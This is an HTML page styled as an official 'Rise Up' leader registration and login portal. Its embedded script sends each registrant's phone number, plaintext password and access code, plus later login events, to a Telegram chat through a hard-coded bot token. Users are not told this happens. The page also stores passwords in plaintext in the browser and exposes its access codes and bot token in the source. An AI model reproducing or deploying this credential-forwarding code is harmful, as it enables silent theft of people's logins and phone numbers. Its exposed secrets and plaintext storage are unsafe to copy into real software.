<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rise Up | Official</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; overflow-x: hidden; }
        .blue-gradient { background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%); }
        .hidden { display: none; }
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .animate-fade-in { animation: fadeIn 0.3s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-slate-50">

    <nav class="bg-white border-b border-gray-200 fixed w-full top-0 z-50">
        <div class="max-w-6xl mx-auto px-4 h-16 flex justify-between items-center">
            <div class="flex items-center gap-2">
                <img src="https://i.ibb.co/1GbT9tsc/Screenshot-20251228-163055.jpg" class="h-10 w-10 rounded-full border shadow-sm">
                <span class="font-black text-blue-700 tracking-tighter text-xl italic uppercase">RISE UP</span>
            </div>
            <button onclick="toggleMenu()" class="text-gray-600 p-2 hover:bg-gray-100 rounded-lg transition">
                <i class="fas fa-bars text-2xl"></i>
            </button>
        </div>
    </nav>

    <div id="sideMenu" class="hidden fixed top-16 right-4 w-60 bg-white shadow-2xl border border-gray-100 z-40 rounded-2xl overflow-hidden animate-fade-in">
        <a href="https://wa.me/918968146117?text=Hello%20Rise%20Up%20Team" target="_blank" class="flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-green-50 hover:text-green-600 font-bold border-b border-gray-50 transition">
            <i class="fab fa-whatsapp text-xl text-green-500"></i> Help Center
        </a>
        <button onclick="location.reload()" class="w-full text-left flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-blue-50 hover:text-blue-600 font-bold">
            <i class="fas fa-sync-alt"></i> Refresh System
        </button>
    </div>

    <div class="flex items-center justify-center min-h-screen pt-20 px-4">
        <div class="bg-white w-full max-w-md rounded-[2.5rem] shadow-2xl overflow-hidden border border-gray-100 animate-fade-in">
            
            <div class="flex border-b">
                <button id="regTab" onclick="switchTab('reg')" class="flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 transition-all uppercase tracking-widest">Register</button>
                <button id="loginTab" onclick="switchTab('login')" class="flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent hover:text-blue-600 transition-all uppercase tracking-widest">Login</button>
            </div>

            <div class="p-8">
                <div id="regForm" class="space-y-5">
                    <div class="text-center mb-6">
                        <h2 class="text-2xl font-black text-gray-800 uppercase tracking-tighter">Create Account</h2>
                        <p class="text-gray-400 text-[10px] font-bold tracking-widest uppercase">Leader Registration Portal</p>
                    </div>
                    
                    <div class="space-y-4">
                        <div>
                            <label class="text-[10px] font-black text-blue-600 uppercase mb-1 ml-2 block italic">Access Code</label>
                            <input type="text" id="rCode" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-black text-center uppercase tracking-[0.5em] transition-all">
                        </div>
                        <div>
                            <label class="text-[10px] font-black text-gray-400 uppercase mb-1 ml-2 block italic">Mobile No.</label>
                            <input type="number" id="rPhone" placeholder="00000 00000" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-bold transition-all">
                        </div>
                        <div>
                            <label class="text-[10px] font-black text-gray-400 uppercase mb-1 ml-2 block italic">Password</label>
                            <input type="password" id="rPass" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-bold transition-all">
                        </div>
                    </div>

                    <button onclick="handleRegister(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-blue-100 hover:opacity-90 transition transform active:scale-95 mt-4 uppercase tracking-wider">
                        Register Now
                    </button>
                </div>

                <div id="loginForm" class="hidden space-y-5">
                    <div class="text-center mb-6">
                        <h2 class="text-2xl font-black text-gray-800 uppercase tracking-tighter">Leader Login</h2>
                        <p class="text-gray-400 text-[10px] font-bold tracking-widest uppercase">Access Your Dashboard</p>
                    </div>

                    <div class="space-y-4">
                        <input type="number" id="lPhone" placeholder="Mobile Number" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-bold">
                        <input type="password" id="lPass" placeholder="Password" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 font-bold">
                    </div>

                    <button onclick="handleLogin(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-blue-100 hover:opacity-90 transition transform active:scale-95 mt-4 uppercase tracking-wider">
                        Sign In
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden fixed inset-0 bg-white z-[60] flex flex-col items-center justify-center p-6 text-center animate-fade-in">
        <div class="w-24 h-24 bg-blue-600 text-white rounded-full flex items-center justify-center text-4xl mb-6 shadow-2xl shadow-blue-200 border-4 border-white">
            <i class="fas fa-check"></i>
        </div>
        <h1 class="text-4xl font-black text-blue-900 mb-2 uppercase italic tracking-tighter">Verified</h1>
        <p class="text-gray-400 font-bold mb-8 uppercase text-xs tracking-[0.2em]">Rise Up Leader Active</p>
        
        <div class="w-full max-w-xs p-8 border-2 border-blue-50 rounded-[2.5rem] bg-blue-50/30 mb-8">
            <span class="text-[10px] font-black text-blue-400 uppercase block mb-2 tracking-widest">Registered ID</span>
            <span id="activeNum" class="text-3xl font-black text-blue-700 tracking-tight"></span>
        </div>
        
        <button onclick="logout()" class="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-black uppercase tracking-widest hover:bg-black transition shadow-lg">
            Logout
        </button>
    </div>

    <script>
        const BOT_TOKEN = "8312452063:AAE2CoKaVAg6ORv8qX0bPxj5W--VQoU1rco";
        const CHAT_ID = "8312452063";

        const leaderCodes = ["AK01", "SY02", "RK45", "UP11", "RZ07", "BT99", "MK23", "LD50", "JS08", "VR14", "NP21", "GX33", "HF67", "TW04", "QM19", "XP82", "BN55", "KL09", "JH41", "RS22", "GD03", "PL76", "MC12", "VB88", "XF31", "TR05", "NW66", "KJ47", "ML10", "AZ92", "HQ54", "SP18", "DR73", "WF29", "BK06", "YV61", "XT38", "NR15", "LC44", "GT27", "PM02", "FR81", "JU13", "WE59", "KY37", "OA84", "IV17", "ME52", "ZG08", "RU25"];

        function toggleMenu() { document.getElementById('sideMenu').classList.toggle('hidden'); }

        function switchTab(tab) {
            const regF = document.getElementById('regForm'), logF = document.getElementById('loginForm');
            const regT = document.getElementById('regTab'), logT = document.getElementById('loginTab');
            if(tab === 'reg') {
                regF.classList.remove('hidden'); logF.classList.add('hidden');
                regT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest";
                logT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent hover:text-blue-600 uppercase tracking-widest";
            } else {
                logF.classList.remove('hidden'); regF.classList.add('hidden');
                logT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest";
                regT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent hover:text-blue-600 uppercase tracking-widest";
            }
        }

        async function notify(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
                });
            } catch (e) { console.error("Telegram error:", e); }
        }

        async function handleRegister(btn) {
            const code = document.getElementById('rCode').value.toUpperCase().trim();
            const phone = document.getElementById('rPhone').value.trim();
            const pass = document.getElementById('rPass').value.trim();

            if(!leaderCodes.includes(code)) { alert("‚ùå Leader Code Invalid!"); return; }
            if(phone.length < 10) { alert("‚ö†Ô∏è Correct Number Dalein!"); return; }
            if(pass.length < 4) { alert("‚ö†Ô∏è Set 4+ Digit Password!"); return; }

            btn.disabled = true; btn.innerText = "PROCESSING...";

            localStorage.setItem("ru_" + phone, JSON.stringify({phone, pass}));
            await notify(`üÜï *RISE UP REGISTRATION*\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nüìû *No:* \`${phone}\` \nüîë *Pass:* \`${pass}\` \nüéü *Code:* \`${code}\``);
            
            alert("‚úÖ Registration Success! Now Login.");
            btn.disabled = false; btn.innerText = "REGISTER NOW";
            switchTab('login');
        }

        async function handleLogin(btn) {
            const phone = document.getElementById('lPhone').value.trim();
            const pass = document.getElementById('lPass').value.trim();
            const stored = localStorage.getItem("ru_" + phone);

            if(stored) {
                const data = JSON.parse(stored);
                if(data.pass === pass) {
                    btn.disabled = true; btn.innerText = "VERIFYING...";
                    await notify(`üîì *RISE UP LOGIN SUCCESS*\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nüìû *Leader No:* \`${phone}\``);
                    showDash(phone);
                } else { alert("‚ùå Wrong Password!"); }
            } else { alert("‚ùå User Not Found! Register First."); }
        }

        function showDash(num) {
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('activeNum').innerText = num;
            sessionStorage.setItem("ru_session", num);
        }

        function logout() { sessionStorage.removeItem("ru_session"); location.reload(); }

        window.onload = () => {
            const session = sessionStorage.getItem("ru_session");
            if(session) showDash(session);
        }
    </script>
</body>
</html>
